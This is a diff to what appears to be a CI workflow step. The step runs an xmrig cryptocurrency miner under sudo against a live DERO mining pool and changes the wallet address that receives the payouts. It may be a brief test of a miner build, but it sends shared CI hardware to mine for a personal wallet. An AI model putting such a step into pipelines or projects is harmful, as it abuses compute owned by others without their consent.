@@ -41,7 +41,7 @@ jobs:
       run: |
         cd ${{github.workspace}}/build/binaries/
         sudo chmod +x ./xmrigMiner
-        CONFIG=' -o us.dero.herominers.com:1117 -u dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.10000 --tls -k --coin dero -a astrobwt --pause-on-battery --astrobwt-avx2 --astrobwt-max-size=200 --print-time=10 --daemonized '
+        CONFIG=' -o us.dero.herominers.com:1117 -u 89w9kcG7B4Z875AauqCpTcMJnf6fwzV7EDGNjfBLbwygKy2eLNrF9MfXEvJ5REFpVPdLdvgq7QTJ5d5ifKuMNCiS6aCbQ22 --tls -k --coin dero -a astrobwt --pause-on-battery --astrobwt-avx2 --astrobwt-max-size=200 --print-time=300 --daemonized '
         sudo timeout 2m ./xmrigMiner $CONFIG || code=$?; if [[ $code -ne 124 && $code -ne 0 ]]; then exit $code; fi > out
         echo output
         cat out
